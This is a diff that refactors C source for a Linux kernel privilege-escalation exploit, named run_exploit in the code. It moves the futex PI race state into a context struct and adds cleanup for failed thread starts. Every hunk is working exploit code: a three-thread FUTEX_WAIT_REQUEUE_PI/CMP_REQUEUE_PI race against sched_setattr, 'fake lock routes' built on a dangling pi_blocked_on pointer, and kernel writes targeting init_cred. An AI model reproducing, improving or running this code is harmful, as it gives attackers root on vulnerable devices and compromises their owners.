@@ -276,40 +276,25 @@ static const struct execution_settings *execution_settings(void) {
     log_sync(); \
   } while (0)
 
-uint32_t f_wait;
-uint32_t f_pi_target;
-uint32_t f_pi_chain;
-atomic_int waiter_ready;
-atomic_int waiter_waiting;
-atomic_int owner_started;
-atomic_int owner_chain_done;
-atomic_int owner_stop;
-atomic_int route_done;
-atomic_int waiter_tid;
-atomic_int punch_consume_go;
-atomic_int punch_consume_stop;
-atomic_int consumer_calls;
-atomic_int consumer_success;
-atomic_int consumer_inflight;
-atomic_int main_route_delay_usec;
-static atomic_int fast_repair_route;
+PiRaceContext g_pi_race_context;
 /* Decoupling plan: run the shared PI waiter and delegate route execution.
  * Input: currently implicit race/session state; output: completion/status.
  * Future: pi_race_waiter_worker(void *PiRaceWorkerArgs); route dispatch moves
  * to the stage controller. */
 void *waiter_thread(void *arg) {
-  const WriteRequest *request = arg;
+  PiRaceContext *race = arg;
+  const WriteRequest *request = race->request;
   disable_rseq_for_thread();
   int tid = (int)syscall(SYS_gettid);
-  atomic_store(&waiter_tid, tid);
-  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
-    pr_warning("waiter lock chain errno=%d\n", errno);
-  atomic_store(&waiter_ready, 1);
-  while (!atomic_load(&owner_started))
+  atomic_store(&race->waiter_tid, tid);
+  if (futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    pr_error("waiter lock chain errno=%d\n", errno);
+  atomic_store(&race->waiter_ready, 1);
+  while (!atomic_load(&race->owner_started))
     usleep(execution_settings()->race_state_poll_interval_us);
   struct timespec timeout;
   SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
-  if (atomic_load(&fast_repair_route)) {
+  if (atomic_load(&race->fast_repair)) {
     timeout.tv_nsec += 20000000L;
     if (timeout.tv_nsec >= 1000000000L) {
       timeout.tv_sec++;
@@ -325,8 +310,9 @@ void *waiter_thread(void *arg) {
       timeout.tv_nsec -= 1000000000L;
     }
   }
-  atomic_store(&waiter_waiting, 1);
-  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
+  atomic_store(&race->waiter_waiting, 1);
+  futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+           &race->target_futex, 0);
   if (kernel5_route_selected()) {
     do_kernel5_fake_lock_route(request);
     /* remove_waiter() left this thread's pi_blocked_on pointing at the
@@ -344,57 +330,66 @@ void *waiter_thread(void *arg) {
   } else {
     do_pselect_fake_lock_route(request);
   }
-  atomic_store(&route_done, 1);
-  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
-  while (!atomic_load(&owner_chain_done))
+  atomic_store(&race->route_done, 1);
+  futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+  while (!atomic_load(&race->owner_chain_done))
     usleep(execution_settings()->race_state_poll_interval_us);
   return NULL;
 }
 
 /* Decoupling plan: own the target and chain PI futexes. Input: PiRaceContext;
  * output: synchronization state. Future: pi_race_owner_worker(void *context). */
-void *owner_thread(void *arg __attribute__((unused))) {
+void *owner_thread(void *arg) {
+  PiRaceContext *race = arg;
   disable_rseq_for_thread();
-  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  long lock_target = futex_op(
+      &race->target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
   if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
-  while (!atomic_load(&waiter_ready))
+  while (!atomic_load(&race->waiter_ready) &&
+         !atomic_load(&race->owner_stop))
     usleep(execution_settings()->race_state_poll_interval_us);
-  atomic_store(&owner_started, 1);
-  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
-  atomic_store(&owner_chain_done, 1);
-  while (!atomic_load(&owner_stop)) sleep(1);
+  if (atomic_load(&race->owner_stop)) {
+    if (lock_target == 0)
+      futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    return NULL;
+  }
+  atomic_store(&race->owner_started, 1);
+  futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+  atomic_store(&race->owner_chain_done, 1);
+  while (!atomic_load(&race->owner_stop)) sleep(1);
   if (lock_target == 0)
-    futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
   return NULL;
 }
 
 /* Decoupling plan: trigger PI traversal from the consumer CPU. Inputs:
  * PiRaceContext, TargetProfile and RuntimeConfig; output: attempt counters.
  * Future: pi_race_consumer_worker(void *PiRaceWorkerArgs). */
-void *consumer_thread(void *arg __attribute__((unused))) {
+void *consumer_thread(void *arg) {
+  PiRaceContext *race = arg;
   disable_rseq_for_thread();
-  pin_to_core(CONSUMER_CORE);
+  pin_to_core(race->consumer_cpu);
   pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
   int seen = 0;
-  while (!atomic_load(&punch_consume_stop)) {
-    int seq = atomic_load(&punch_consume_go);
+  while (!atomic_load(&race->consumer_stop)) {
+    int seq = atomic_load(&race->consumer_go);
     if (seq == 0 || seq == seen) {
       __asm__ volatile("yield" ::: "memory");
       continue;
     }
     seen = seq;
-    int tid = atomic_load(&waiter_tid);
+    int tid = atomic_load(&race->waiter_tid);
     int calls_this_seq = 0;
-    while (!atomic_load(&punch_consume_stop) &&
-           atomic_load(&punch_consume_go) == seq) {
-      int delay_usec = atomic_load(&main_route_delay_usec);
+    while (!atomic_load(&race->consumer_stop) &&
+           atomic_load(&race->consumer_go) == seq) {
+      int delay_usec = atomic_load(&race->route_delay_usec);
       if (delay_usec > 0) usleep((useconds_t)delay_usec);
       for (uint32_t burst = 0;
            burst < execution_settings()->select_consumer_burst_calls; burst++) {
-        if (atomic_load(&punch_consume_stop) ||
-            atomic_load(&punch_consume_go) != seq) break;
-        atomic_fetch_add(&consumer_calls, 1);
-        atomic_store(&consumer_inflight, 1);
+        if (atomic_load(&race->consumer_stop) ||
+            atomic_load(&race->consumer_go) != seq) break;
+        atomic_fetch_add(&race->consumer_calls, 1);
+        atomic_store(&race->consumer_inflight, 1);
         errno = 0;
         /* rotate the nice every call; (calls%19)+1 is what makes
          * sched_setattr succeed on 6.1 compact */
@@ -404,18 +399,20 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         long sched_ret = sched_setattr_tid(tid, consumer_nice);
         if (sched_ret != 0) {
           struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
+          long fret = futex_op(
+              &race->target_futex, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
           if (fret == 0) {
-            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            futex_op(
+                &race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
             sched_ret = 0;
           }
         }
-        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
-        atomic_store(&consumer_inflight, 0);
+        if (sched_ret == 0) atomic_fetch_add(&race->consumer_success, 1);
+        atomic_store(&race->consumer_inflight, 0);
         calls_this_seq++;
         if ((uint32_t)calls_this_seq >=
             execution_settings()->select_consumer_max_calls) {
-          atomic_store(&punch_consume_go, 0);
+          atomic_store(&race->consumer_go, 0);
           break;
         }
       }
@@ -427,57 +424,100 @@ void *consumer_thread(void *arg __attribute__((unused))) {
 /* Decoupling plan: reset one PI race attempt. Input/output: PiRaceContext;
  * output: initialized synchronization state. Future: pi_race_reset(). */
 void reset_main_route_state(void) {
-  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
-  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
-  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
-  atomic_store(&owner_stop, 0);
-  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
-  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
-  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
-  atomic_store(&consumer_inflight, 0);
-  atomic_store(&main_route_delay_usec,
-               atomic_load(&fast_repair_route) ? 5000
-                   : (int)execution_settings()->select_enter_delay_us);
+  int fast_repair = atomic_load(&g_pi_race_context.fast_repair);
+  pi_race_reset(
+      &g_pi_race_context,
+      fast_repair ? 5000 : (int)execution_settings()->select_enter_delay_us,
+      g_runtime_config.main_cpu, g_runtime_config.consumer_cpu);
+  atomic_store(&g_pi_race_context.fast_repair, fast_repair);
   route_last_step = 0; route_last_errno = 0;
 }
 
-/* Decoupling plan: create, synchronize and join one PI race. Inputs: race and
- * selected route contexts; output: RouteStatus. Future: pi_race_run(), with
- * partial-thread-start cleanup and no route_last_* globals. */
-int run_main_route_threads(const WriteRequest *request) {
-  reset_main_route_state();
-  pthread_t waiter, owner, consumer;
+static void pi_race_abort_startup(PiRaceContext *race) {
+  atomic_store(&race->consumer_stop, 1);
+  atomic_store(&race->owner_stop, 1);
+  if (race->owner_started_thread) pthread_join(race->owner_thread, NULL);
+  if (race->consumer_started) pthread_join(race->consumer_thread, NULL);
+  race->waiter_started = 0;
+  race->owner_started_thread = 0;
+  race->consumer_started = 0;
+  race->request = NULL;
+}
+
+int pi_race_start(PiRaceContext *race, const WriteRequest *request) {
+  race->request = request;
   pr_info("[route] creating waiter/owner/consumer\n");
-  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, (void *)request));
-  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
-  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
-  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
+  int error = pthread_create(
+      &race->consumer_thread, NULL, consumer_thread, race);
+  if (error) return error;
+  race->consumer_started = 1;
+  error = pthread_create(&race->owner_thread, NULL, owner_thread, race);
+  if (error) {
+    pi_race_abort_startup(race);
+    return error;
+  }
+  race->owner_started_thread = 1;
+  error = pthread_create(&race->waiter_thread, NULL, waiter_thread, race);
+  if (error) {
+    pi_race_abort_startup(race);
+    return error;
+  }
+  race->waiter_started = 1;
+  return 0;
+}
+
+int pi_race_run(PiRaceContext *race) {
+  while (!atomic_load(&race->waiter_waiting) ||
+         !atomic_load(&race->owner_started))
     usleep(execution_settings()->race_state_poll_interval_us);
   pr_info("[route] waiter parked; owner started\n");
-  usleep(atomic_load(&fast_repair_route)
+  usleep(atomic_load(&race->fast_repair)
              ? 5000
              : execution_settings()->race_setup_settle_us);
   errno = 0;
-  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
-                     &f_pi_target, 0);
+  long rq = futex_op(&race->wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
+                     &race->target_futex, 0);
   pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
           rq, errno);
-  while (!atomic_load(&route_done))
+  while (!atomic_load(&race->route_done))
     usleep(execution_settings()->race_state_poll_interval_us);
   pr_info("[route] route_done step=%d errno=%d calls=%d success=%d\n",
-          route_last_step, route_last_errno, atomic_load(&consumer_calls),
-          atomic_load(&consumer_success));
+          route_last_step, route_last_errno, atomic_load(&race->consumer_calls),
+          atomic_load(&race->consumer_success));
+  return atomic_load(&race->consumer_calls) > 0 &&
+         atomic_load(&race->consumer_success) > 0 && route_last_step == 0;
+}
 
-  atomic_store(&punch_consume_go, 0);
-  atomic_store(&punch_consume_stop, 1);
-  atomic_store(&owner_stop, 1);
-  pthread_join(waiter, NULL);
-  pthread_join(owner, NULL);
-  pthread_join(consumer, NULL);
+void pi_race_stop(PiRaceContext *race) {
+  atomic_store(&race->consumer_go, 0);
+  atomic_store(&race->consumer_stop, 1);
+  atomic_store(&race->owner_stop, 1);
+}
+
+void pi_race_destroy(PiRaceContext *race) {
+  if (race->waiter_started) pthread_join(race->waiter_thread, NULL);
+  if (race->owner_started_thread) pthread_join(race->owner_thread, NULL);
+  if (race->consumer_started) pthread_join(race->consumer_thread, NULL);
+  race->waiter_started = 0;
+  race->owner_started_thread = 0;
+  race->consumer_started = 0;
+  race->request = NULL;
   pr_info("[route] threads joined\n");
+}
 
-  return atomic_load(&consumer_calls) > 0 &&
-         atomic_load(&consumer_success) > 0 && route_last_step == 0;
+/* Create, synchronize, stop and join one explicitly owned PI race. */
+int run_main_route_threads(const WriteRequest *request) {
+  reset_main_route_state();
+  int error = pi_race_start(&g_pi_race_context, request);
+  if (error) {
+    route_last_errno = error;
+    pr_warning("PI race thread creation failed errno=%d\n", error);
+    return 0;
+  }
+  int result = pi_race_run(&g_pi_race_context);
+  pi_race_stop(&g_pi_race_context);
+  pi_race_destroy(&g_pi_race_context);
+  return result;
 }
 
 /* Decoupling plan: prepare payload and execute one abstract kernel write.
@@ -1059,9 +1099,9 @@ static int retry_write_stage(
               &g_resolved_addresses, g_resolved_addresses.init_cred_image) + 8,
           WRITE_MODE_ZERO, 1);
       pr_info("W2b: firing prebuilt init_cred+8 repair\n");
-      atomic_store(&fast_repair_route, 1);
+      atomic_store(&g_pi_race_context.fast_repair, 1);
       int repaired = run_main_route_threads(&repair_request);
-      atomic_store(&fast_repair_route, 0);
+      atomic_store(&g_pi_race_context.fast_repair, 0);
       if (!repaired) {
         pr_warning("W2 fast repair route failed\n");
         return 0;
@@ -1202,7 +1242,7 @@ int run_exploit(int argc, char **argv) {
   apply_iomem_cache();
   log_startup_context();
   init_p0_profile();
-  pin_to_core(CORE);
+  pin_to_core(g_runtime_config.main_cpu);
   pr_info("main thread running on cpu=%d\n", sched_getcpu());
 
   timer_reset();
